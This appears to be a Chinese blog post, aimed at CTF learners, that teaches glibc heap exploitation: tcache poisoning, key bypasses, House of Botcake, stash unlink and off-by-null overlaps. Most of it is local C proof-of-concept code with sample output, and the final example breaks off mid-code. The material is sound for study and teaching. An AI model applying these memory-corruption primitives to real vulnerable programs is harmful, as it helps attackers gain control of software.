通过 tcache poisoning 改fd一定偏移到tcache_perthread_struct 然后malloc 到 tcache_perthread_struct 就可以控制整个 tcache（但控制整个前提是size得大才行） 。可以改entries分配任意地址堆或者改大count使得free不进入tcachebin


```c
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```
### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c0+0x8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{
    size_t* chunk1=malloc(0x10);
    free(chunk1);
    free(chunk1);
    size_t* chunk2=malloc(0x10);
    size_t* heapbase=chunk2[0]-0x260; //chunk header
    chunk2[0]=heapbase;
    malloc(0x10);
    size_t* destchunk=malloc(0x10);
    printf("tcache_perthread_struct 0x%p\n",getheap());
    printf("destchunk 0x%p\n",destchunk);

}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/db395e5b337f4fab8f2403c76fedc408.png)



## tcache extend
修改 chunk 的 size 然后释放并重新申请出来就可以造成堆块重叠。size 在 tcache 范围和不是负数和对齐0x10（去除field bit），然后free的参数即地址是0x10对齐的

### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
int main()
{   
    size_t* chunk1=malloc(0x20);
    size_t* chunk2=malloc(0x20);
    size_t* chunk3=malloc(0x20);
    chunk1[-1]=0x90;
    free(chunk1);
    size_t* extent_chunk=malloc(0x80);
    printf("extent_chunk size %p\n",chunk1[-1]);
    printf("chunk2 size %p\n",chunk1[5]);
    printf("chunk3 size %p\n",chunk1[11]);
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ed82bce0a5324f05a623fa9606011e00.png)
## tcache key
自 glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk 字段，值为 tcache 结构体的地址，若 free() 检测到 chunk->bk == tcache 则会遍历 tcache 查找对应链表中是否有该chunk。最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制


```c
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
```
### 泄露堆地址
由于 tcache 用的是tcache_perthread_struct chunk的 fd 字段所在地址，因此可以通过泄露 tcache key 来泄露堆地址。
```c
static __thread tcache_perthread_struct *tcache = NULL;
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
glibc-2.34 开始，tcache 的 key 不再是 tcache_pthread_struct 结构体地址，而是一个随机数 tcache_key ，因此不能通过 key 泄露堆地址。

```c
// glibc-2.33
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

// glibc-2.34
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

```

#### poc
```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{   
    size_t* chunk1=malloc(0x20);
    free(chunk1);
    size_t* key=chunk1[1];
    size_t* heapbase_fd=getheap()+0x10;

    printf("heapbase memory part %p\n",heapbase_fd);
    printf("chunk key %p\n",key);
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/da06a1e0f0674778851cb6e23bfd23d0.png)

### tcache key bypass
如果有相关key得double free检查，在进行 tcache double free 之前，还需要想办法绕过 tcache key 的保护。
常见的 tcache key bypass 手段如下

- 清除 tcache key：通过一些 UAF 手段将该 free chunk 中记录的 tcache key清除，从而绕过该检测。
- house of kauri：通过修改 size 使两次 free 的同一块内存进入不同的 entries 。
- tcache stash with fastbin double free：在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成 double free，随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中。此时 fsat bin double free 就变成了 tcahce double free 。（即高版本double free 注意fastbin中1->2->1->2->1……，分配走1后，由于取走1后fastbin中会变成 2->1->2,进而进入tcache中是 2->1->2）
- House of Botcake
同一个 chunk 释放到 tcache 和 unsorted bin 中。释放在 unsorted bin 的 chunk 借助堆块合并改变大小。相对于上一个方法，这个方法的好处是一次 double free 可以多次使用，因为控制同一块内存的 chunk 所属不同（一个拿到unsortedbin的chunkB，另一个拿着tcachebin中的chunkB，可以通过拿到unsortedbin的chunkB修改进入到tcachebin中的chunkB，然后malloc出tcachebin中的chunkB，malloc出fd对应chunk，然后可以再free使得进入到tcachebin中的chunkB，然后unsortedbin的chunkB继续修改）。
  1. 申请7个大小相同，大小大于0x80的chunk，再申请三个，分别为chunk A和chunkB和chunk C（C防止合并），chunkAB大小和之前那7个一样
  2. 释放前7个和chunk A，前面7个都会进入到tcachebin里面，chunk A进入到unsortedbin
  3. 释放chunk B，则chunk B会和chunk A合并
  4. 从tcachebin分配走一个
  5. 再次释放chunk B，此时B同时存在与unsortedbin和tcachebin
  6. 然后malloc一次或者多次size大小不大于合并后的chunkAB大小，能够拿到一个能控制chunkB的chun0k

### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{    
    printf("--------------------------------------------\n");
    //清除 tcache key：通过一些 UAF 手段将该 free chunk 中记录的 tcache key清除，从而绕过该检测。
    size_t* chunk1=malloc(0x10);
    free(chunk1);
    size_t* key=chunk1[1];
    printf("chunk key %p\n",key);
    chunk1[1]=0; 
    free(chunk1);
    printf("chunk1 fd %p\n",chunk1[0]);
    printf("chunk1  %p\n",chunk1);
    printf("--------------------------------------------\n");
    //house of kauri：通过修改 size 使两次 free 的同一块内存进入不同的 entries 。
    size_t* chunk2=malloc(0x20);
    free(chunk2);
    chunk2[-1]=0x40; 
    free(chunk2);
    size_t* heapbase=getheap();
    printf("tcache bin 0x30 entry %p\n",heapbase[0x13]);
    printf("tcache bin 0x40 entry %p\n",heapbase[0x14]);
    printf("--------------------------------------------\n");
    // tcache stash with fastbin double free：
    // 在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成 double free，
    // 随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中。此时 fsat bin double free 就变成了 tcahce double free 。
    size_t* chunkarray[0x10];
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x60);
    }
    size_t* chunk3=malloc(0x60);
    size_t* chunk4=malloc(0x60);
     for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }

    free(chunk3);
    free(chunk4);
    free(chunk3);
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x60);
    }
    chunk3=malloc(0x60);
    size_t fake_chunk[4];
    chunk3[0]=&fake_chunk[2]; //any just can be access
    malloc(0x60);
    malloc(0x60);
    size_t* dest_chunk=malloc(0x60);
    printf("(dest_chunk==&fake_chunk[2])= %d\n",dest_chunk==&fake_chunk[2]);
    printf("--------------------------------------------\n");
    //      House of Botcake
    // 同一个 chunk 释放到 tcache 和 unsorted bin 中。释放在 unsorted bin 的 chunk 借助堆块合并改变大小。
    // 相对于上一个方法，这个方法的好处是一次 double free 可以多次使用，因为控制同一块内存的 chunk 大小不同。
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x80);
    }    
    size_t* chunk5=malloc(0x80);
    size_t* chunk6=malloc(0x80);
    size_t* chunk7=malloc(0x80);
     for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }    
    free(chunk5); 
    free(chunk6);
    malloc(0x80);
    free(chunk6); //chunk6同时存在与unsortedbin和tcachebin
    size_t* chunk8 =malloc(0x110);
    printf("chunk 8 +0x80+0x10 %p\n",&chunk8[18]);
    printf("chunk 6 %p\n",chunk6);
    printf("--------------------------------------------\n");
}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f1239437cae44cd3868f878046690477.png)
## fastbin_reverse_into_tcache

calloc 申请内存不会从 tcache 中获取，而是从 bin 中获取。如果取的是fastbin中的，取完后，会将 fast bin 中剩余的 chunk 放入 tcache 中。如果修改要取出的 fast bin 中 chunk 的 fd 指针，当剩余chunk（即写的fd）放入tcache时，则会在 fd + 0x10 地址处写入一个堆地址（或者加密的堆地址，反正值较大）

- 同样要能访问fd，并且fd对应的fd为空或者能够访问才行，不然会一直遍历下去直到为空位置。
-  如果fd 的 fd 指向无效地址，需要在 fast bin 中预留另外 多个 chunk 来填满 tcache 。使得fd进入后tcache填满，不会再去访问fd的fd值

```c
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd;
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
```
如果是使用 malloc 可以先消耗完 tcache 中的 chunk 然后再触发 stash 机制完成攻击。不过此时tcache没有chunk了，此时如果开了next是加密的话依然会写一个大地址，没有的话那不会写，或者fastbin预留多个chunk，覆写后面进入的一个chunk的fd

### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{    
    size_t* chunkarray[0x10];
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x10);
    }
    size_t* chunk1=malloc(0x10);
    size_t* chunk2=malloc(0x10);
    malloc(0x10);
     for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    free(chunk1);
    free(chunk2);
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x10);
    }
    size_t fakechunk[0x20];
    chunk1[0]=fakechunk;
    fakechunk[2]=NULL;
    size_t* chunk3=malloc(0x10);
    printf("fakechunk[2] %p\n",fakechunk[2]);
    printf("chunk2 %p\n",chunk1);

}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0322b74246ae459584681a49f88c0170.png)
## tcache stash unlink
第一次从 small bin 中取出 chunk 时会对该 chunk 的 bk 指向的 chunk 的 fd 进行检查：

```c
idx = smallbin_index (nb);
bin = bin_at (av, idx);

if ((victim = last (bin)) != bin)
  {
	bck = victim->bk;
	if (__glibc_unlikely (bck->fd != victim))
	  malloc_printerr ("malloc(): smallbin double linked list corrupted");
	set_inuse_bit_at_offset (victim, nb);
	bin->bk = bck;
	bck->fd = bin;
	...
```

- small bin 放两个 chunk 是为了绕过第一次从 small bin 取 chunk 时的检查。
- tcache 放 5 个 chunk 并 calloc 申请内存既可以保证 两次 stash 将 fake chunk1 申请到tcach中，同时确保 stash 次数不会过多造成访存错误。
tcache stash unlink 最终效果是任意地址 malloc 和任意地址写某个值（往bk->fd写个地址）。

```c
/* While bin not empty and tcache not full, copy chunks over.  */
while (tcache->counts[tc_idx] < mp_.tcache_count
	&& (tc_victim = last (bin)) != bin)
	{
	  if (tc_victim != 0)
	    {
			bck = tc_victim->bk;
			set_inuse_bit_at_offset (tc_victim, nb);
			if (av != &main_arena)
			set_non_main_arena (tc_victim);
			bin->bk = bck;
			bck->fd = bin;
			
			tcache_put (tc_victim, tc_idx);
	     }
	}

```
注意伪造的chunk的bk要是可以访问的，并且会在伪造的chunk的bk的fd处写个libc地址，同时注意两个smallbin不能相邻，不然会合并
```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{    
    size_t* chunkarray[0x10];
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x80);
    }
    size_t* chunk1=malloc(0x80);
    malloc(0x10);  //prevent  merge
    size_t* chunk2=malloc(0x80);
    malloc(0x10);  //prevent  merge
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    free(chunk1);
    free(chunk2);


    malloc(0x90);

    for(int i=0;i<2;i++)
    {
        chunkarray[i]=malloc(0x80);
    }

    size_t fakechunk1[0x20];
    size_t fakechunk2[0x20];
    chunk2[1]=fakechunk1;  //bk
    fakechunk1[3]=fakechunk2;   // bk->bk->fd = unsorted bin libc and bk can be written

    size_t* chunk3=calloc(1, 0x80);
    
    size_t* chunk4=malloc(0x80);
    printf("fakechunk1 %p\n",fakechunk1);
    printf("fakechunk1 enter tcache fakechunk1[2] %p\n",fakechunk1[2]);
    printf("fakechunk2 in smallbin fd = unsortedbin libc fakechunk2[2] %p\n",fakechunk2[2]);   //write fakechunk2->fd libc 
    printf("malloc(0x80) chunk4 %p\n",chunk4);
    

}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6beda5fa0cc74994850ad2860f3ad37d.png)

# Heap Overlapping

这里的堆块重叠指的是指让一个堆块能控制另一个堆块的头部，而不是只能控制内存区域，这个条件比普通的 UAF 要强很多。因为普通UAF就是通过控制内存区域，但控制不了头部
## UAF 转 Heap Overlapping
fastbin中，在可控堆块的内存区域伪造 一个chunk（伪造size） ， 然后利用 UAF 部分地址写将 fd 修改到伪造的 chunk 头部，之后利用将 fake chunk 申请出来就可以控制到下一个堆块部分（起始地址在原chunk里，但size一样，当然溢出了），造成造成堆块重叠。（但UAF其实就可以理解为一个heap_overlap了感觉   tcache中不需伪造chunk。改fd就行）

### poc
依然可以通过libc地址泄露heapbase
```bash
 0x7ffff7fae3c0 (mp_+96) —▸ 0x55555555b000 ◂— 0
```

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x79e60;
    size_t* mp_72=libc_addr+0x1f23c0;
    size_t heap=*mp_72;
    return heap;
}

int main()
{    
    size_t chunkarray[0x10];
    size_t heap=getheap();
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x40);
    }
    size_t* chunk1=malloc(0x40);
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    free(chunk1);
    chunk1[0]=(size_t)(chunk1+2)^(heap>>12); //fd to fake chunk
    chunk1[3]=0x51;    // fake chunk size
    chunk1[4]=heap>>12;  // will fastbin into tcache so fake fd is 0^ heap>>12
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x40);
    }
    size_t*chunk2=malloc(0x40);
    size_t*chunk3=malloc(0x40);
    printf("chunk3 data begin %p \n",chunk3);
    printf("chunk3 data end %p \n",chunk3+8);
    printf("chunk1 data begin %p \n",chunk1);
    printf("chunk1 data end %p \n",chunk1+8);

}
```

```bash
getheap
chunk3 data begin 0x55555555b900 
chunk3 data end 0x55555555b940 
chunk1 data begin 0x55555555b8e0 
chunk1 data end 0x55555555b920 


```

##  Off by Null 转 Heap Overlapping
[高版本off-by-null堆攻击](https://xz.aliyun.com/t/15453?time__1311=GqjxnDuGGQi=0=D/D0ex2lCK4RtDgQ671oD)
[高版本off by null的总结](https://www.cnblogs.com/trunk/p/17308229.html)
### 控制prev_size和size低字节
off by null 比 off by one 条件要弱一些，这里写off by null 制造堆块重叠的方法。

如果是在输入的内容后面一个字节写 0 ，即可以控制下一个 chunk 的 prev_size 和 它的size 的 最低 1 字节写 0，那么可以采用下面的方法制造堆块重叠。

- 分配chunk1 chunk2 chunk3
- 释放 chunk1 然后写修改 chunk3 的 prev_size 和chunk2时offbynull修改chunk3 的 size的PREV_INUSE 位（顺序不能错，否则 chunk1 会与 chunk2 合并出错 此时会将chunk2给unlink，` nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  if (!nextinuse) {
     unlink(av, nextchunk, bck, fwd);
   size += nextsize;`但unlink中存在检查当前要unlink的size，`  if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \malloc_printerr ("corrupted size vs. prev_size");` 过不了)，`  之后释放 chunk3 与 chunk1 合并，从而造成堆块重叠。

注意定义`TRIM_FASTBINS`才会将与topchunk相邻的fastbin先向低地址合并，再向topchunk合并（一般编译定义）
```c
 if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {
```
#### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x79e60;
    size_t* mp_72=libc_addr+0x1f23c0;
    size_t heap=*mp_72;
    return heap;
}

int main()
{    
    char* chunkarray[0x10];
    //size_t heap=getheap();
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0xf8);
    }
    char* chunk1=malloc(0xf8);
    char* chunk2=malloc(0xf8);
    char* chunk3=malloc(0xf8);
    malloc(0x10);
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    
    free(chunk1);
    *(size_t*)(&chunk2[0xf0])=0x200; //prev_size
    chunk2[0xf8]=0;  // chunk2 size low byte

    free(chunk3);
    char* chunk4=malloc(0x2f0);

    printf("chunk4 data begin %p \n",chunk4);
    printf("chunk4 size %p \n",*(size_t*)(chunk4-8));
    printf("chunk2  %p \n",chunk2);
    printf("&chunk4[0x100] %p \n",&chunk4[0x100]);

}
```

```c
chunk4 data begin 0x55555555b960 
chunk4 size 0x301 
chunk2  0x55555555ba60 
&chunk4[0x100] 0x55555555ba60 

```

### 只能控制size的低字节
如果不是在输入的内容后面一个字节写 0 ，即在下一个 chunk 的 size 最低 1 字节写 0 但不能控制 prev_size 时可以采用下面的方法


- 分配chunk1 chunk2 chunk3
- 释放掉chunk2，chunk1 溢出该chunk2的size改低字节为零（改小了，这样当分配完chunk2也不会改到chunk3的prev_size和size）
- 分配chunk4 chunk5从chunk2中分割出来，此时把改小的chunk2给分配完，然后释放chunk4
- 释放chunk3，此时chunk3由于之前残留的prev_size，认为原来的chunk2是它的相邻的前一个chunk，合并后，此时malloc申请可以控制chunk5
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3048cf3313134899b1893fb7267fbe8f.png)

但glibc-2.26加入检测 unlink的检测，当改size后再malloc从unsortedbin中分割时，会先unlink在unsortedbin中的chunk。如果改了size，会校验不相等
```c
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			
```

#### poc

```python
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>


int main()
{    
    char* chunkarray[0x10];

    char* chunk1=malloc(0x200);
    char* chunk2=malloc(0x200);
    char* chunk3=malloc(0x200);
    malloc(0x10);
   

    free(chunk2);  // make chunk prev_size for chunk 2 size
    *(char*)(chunk2-8)=0;

    char* chunk4=malloc(0x80);   // needed into unsortedbin  else unlink can't pass
    char* chunk5=malloc(0x80);  //  part of emainder can control remainder  
    free(chunk4);

    free(chunk3);   // merge 
    char* chunk6=malloc(0x410);
    
    printf("chunk5 data begin %p \n",chunk5);

    printf("&chunk6[0x90] %p \n",&chunk6[0x90]);

}
```

```c
chunk5 data begin 0x55555555b2b0 
&chunk6[0x90] 0x55555555b2b0 
```

### size限制
[2021 DJBCTF Writeup](https://www.anquanke.com/post/id/229711)
[CTF PWN 题之 setbuf 的利用](https://paper.seebug.org/450/)

如果不能释放和申请 tcache/fastbin 范围之外的 chunk （合并需要unsortedbin）则可以构造如下结构，通过 scanf("%d", &id) 时输入会调用产生如下调用栈来申请 1024（0x400）大小的堆块触发 malloc_consolidate 实现堆块合并，最终造成堆块重叠。

```c
#0  __GI___libc_malloc (bytes=1024) at malloc.c:3033
#1  0x00007ffff7a8ea79 in __GI__IO_file_doallocate (fp=0x7ffff7dd2a00 <_IO_2_1_stdin_>) at filedoalloc.c:101
#2  0x00007ffff7a9cd66 in __GI__IO_doallocbuf (fp=fp@entry=0x7ffff7dd2a00 <_IO_2_1_stdin_>) at genops.c:365
#3  0x00007ffff7a9bd7c in _IO_new_file_underflow (fp=0x7ffff7dd2a00 <_IO_2_1_stdin_>) at fileops.c:495
#4  0x00007ffff7a9ce22 in __GI__IO_default_uflow (fp=0x7ffff7dd2a00 <_IO_2_1_stdin_>) at genops.c:380
#5  0x00007ffff7a7e48f in _IO_vfscanf_internal (s=<optimized out>, format=<optimized out>, argptr=argptr@entry=0x7fffffffdb38, errp=errp@entry=0x0) at vfscanf.c:630
#6  0x00007ffff7a8cd4f in __isoc99_scanf (format=<optimized out>) at isoc99_scanf.c:37

```
`malloc_consolidate合并对于高地址chunk的合并策略如下，同时为了绕过unlnk，还需伪造fd，bk，和prev_size
```c
	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

	  if (!nextinuse) {
	    size += nextsize;
	    unlink(av, nextchunk, bck, fwd);
	  } else
	    clear_inuse_bit_at_offset(nextchunk, 0);
```

#### poc

```c
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x6dfe0;
    size_t* mp_72=libc_addr+0x3af2c8;
    size_t heap=*mp_72;
    return heap;
}

int main()
{    
    int id;
    

    size_t heapbase=getheap();
    char* chunkarray[0x10];

    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x70);
    }
    char* chunk1=malloc(0x70);
    char* chunk2=malloc(0x80);
    char* chunk3=malloc(0x100);
    malloc(0x10);
   
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }

    free(chunk1);  // into fastbin
    *(size_t*)(chunk3-16)=0x90;  // chunk 2 overflow chunk3 prev_size
    *(char*)(chunk3-8)=0; //chunk2 overflow  chunk3 size 
    *(size_t*)chunk2=heapbase+0xa60; // fake chunk fd
    *(size_t*)(chunk2+8)=heapbase+0xa60;  //fake chunk bk
    
    scanf("%d",&id);
    
    char* chunk4=malloc(0x100);

    printf("chunk2 data begin %p \n",chunk2);

    printf("&chunk5[0x80] %p \n",&chunk4[0x80]);
}
```

```bash
getheap
1
chunk2 data begin 0x55555555ba70 
&chunk5[0x80] 0x55555555ba70 

```

自 glibc-2.29 起加入了 prev_size 的检查，以上方法均已失效。不过要是能够泄露堆地址可以利用 unlink 或 house of einherjar 的思想伪造 fd 和 bk 实现堆块重叠。

```c
    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      if (__glibc_unlikely (chunksize(p) != prevsize)) // 新加的检查。前一块chunk的size和prevsize要相等。
        malloc_printerr ("corrupted size vs. prev_size while consolidating");
      unlink_chunk (av, p);
    }
```
## 高版本(2.29) Off by Null 不泄露堆地址转 Heap Overlapping
[glibc2.29+的off by null利用](https://tttang.com/archive/1614/#toc__2)

难点
- fakechunk的size要和当前释放的chunk的prev_size一样（2.29）
- fakechunk的fd和bk符合链表
- fakechunk通过size得到的下一个chunk的prev_size要和fakechunk的size一样（2.26）
- off by null默认会多写入一个0字节，意味着，最少要覆盖2字节。比如要部分写fd时，read最少读入一个字节，实际因为off by null还会多追加1个0字节，这样fd的低第2位为\x00，即0x????00??。很多情况下，因为低第2字节不完全可控(aslr)，所以我们希望只部分写1个字节。
### 爆破法（爆破四位）
通过堆布局使得 chunk p （即做unlink的chunk）的地址为 0x?????0??。然后再1/16的概率爆破成0x????00??。这样做可以方便在部分写入时，很容易写成p。

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/9ecdd51264b349439bbf1c7df2484f77.png)
目标是free victim可以合并p,然后prev此时和p重叠：

- p满足unlink条件构造。即 b->p->a 双向链表（不需要设置 b->bk和a->fd）

- p.size == victim.prev_size

大概流程
1. 将prev a b释放掉，然后操作申请大chunk使得进入largbin然后通过size构成b -> prev->a ，完成设置fake chunk，p->fd=a，p->bk=b，p.size=0x501。 
2. 取出prev，此时largebin: b->a.此时申请出b，部分写b的fd为p
3. 取出a，再释放到unsortedbin中，再放入victim。此时unsortedbin: victim->a，再次取出a，部分写bk指针为p
4. 把victim申请回来。再伪造prev_size, off by null填充size 的prev_inuse位。(how2heap中是在步骤2申请回来prev来伪造prev_size和off by null size的prev-inuse位，实际上在这里伪造，顺带覆盖prev_inuse更符合实际操作，不过这也无伤大雅)

我稍微改动了下，让他看上去只有off by null的条件。主要是第三步，用了另一个chunk来达成chunk->a

#### poc

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    malloc(0xd90) // padding make fake chunk addr 0x?0??
    void *prev = malloc(0x500);
    void *victim1 = malloc(0x4f0);
    void *victim2 = malloc(0x4f0);
    malloc(0x10);  // padding 
    void *a = malloc(0x4f0);
    malloc(0x10); // padding 
    void *b = malloc(0x510);
    malloc(0x10); // padding 

    free(a);
    free(b);
    free(prev);
    malloc(0x1000);  // make a  b prev enter into largebin  
    // b-> prev-> a
    
    void *prev2 = malloc(0x508);
    ((long *)prev)[1] = 0x501;  // p->size=0x501
    *(long *)(prev + 0x500) = 0x500;  // victim1->prevsize=0x500
    *(char *)(prev + 0x508) = '\x00';    // victim1->size =0x500

    void *b2 = malloc(0x510); 
    ((char*)b2)[0] = '\x60';
    ((char*)b2)[1] = '\x12';  // b->fd = p
   

    void *a2 = malloc(0x4f0);
    free(a2);
    free(victim2);    // victim2->a2
    void *a3 = malloc(0x4f0); 
    ((char*)a3)[8] = '\x60';
    ((char*)a3)[9] = '\x12'; // a->bk = p
    victim2 = malloc(0x4f0);


    free(victim1); // merge victim1 with  prev
    void *merged = malloc(0x100);
    memset(merged, 'A', 0x80);
    memset(prev2, 'C', 0x80);
    printf("merged address: %p\n", merged);
    printf("prev address: %p\n", prev2);
}

pwndbg> c
Continuing.
merged address: 0x555d8a887270
prev address: 0x555d8a887260
[Inferior 1 (process 6713) exited normally]

```

### 改进版直接法（无特殊限制）
通过后向合并，把构造好的fd和bk指针保留下来。这样从unsortedbin中取出来时，就不会破坏这个fd。并且fd存在于chunk内部而不是紧接着chunk metedata，这样就可以部分写入1个0字节到fd。不像之前至少写入两个字节到fd

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/61e9495c4d9e45e995b71b8f9dc08eae.png)
目标是让H1可以合并C0：

- C0满足unlink条件构造。即 D->C0->A 双向链表 （不需要设置 D->bk和A->fd）

- C0. size == H1.prev_size

大概流程
1. 释放A, C0, D。此时unsortedbin: D->C0->A。通过释放B0，让B0和C0合并成BC，从而保存构造好fake chunk指针：C0->fd、C0->bk。（其中C0就是要伪造的chunk p，地址对齐为0x????00. （后两位为0），无需爆破）
2. 申请B1，分割BC。B1.size = B0.size+0x20， 此时可以把C0的size改成0x551。再把剩下的C1、 D、 A申请回来。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/9a29db5846b24d5abc72ca7ce8137750.png)
3. 设置A->bk=p，释放A 、C1，此时unsortedbin: C1->A。再取出A、C1，就可以部分写A->bk 为 C0
4. 设置B->fd=p，释放C1，D，此时unsortedbin: D->C1。再释放H，让H和D合并成HD，这样就可以保存构造好的D->fd 。通过H1部分写D->fd为C0。这样做的好处在于可以只部分写1个0字节，即解决难点1。
5. 最后通过H1上方的barrier，off by null设置H1.prev_size = 0x550, H1.prev_inuse=0。就完成了最终布局。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/41ae121a91cd4e1a9140a28be979a7dc.png)
最后合并后与barrier和c1部分和B1的最后0x20字节重叠

#### poc

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    void *a=malloc(0x410);
    malloc(0x540); //padding 
    void *b0 = malloc(0x430);
    void *c0 = malloc(0x430);
    void *padding=malloc(0x100); //padding 
    void *h0 = malloc(0x4f0);
    void *d = malloc(0x420);
    malloc(0x10); // padding 

    free(a);
    free(c0);
    free(d);
    free(b0);  //merge b0 with c0   and save c0->fd  c0->bk 
   
    void *b1 = malloc(0x450); //split  merge b0 with c0
    ((long *)b1)[0x438/8] = 0x551;  // c0->size=0x551
    void *c1 = malloc(0x410);
    a=malloc(0x410);
    d = malloc(0x420);  // get back


    free(a);
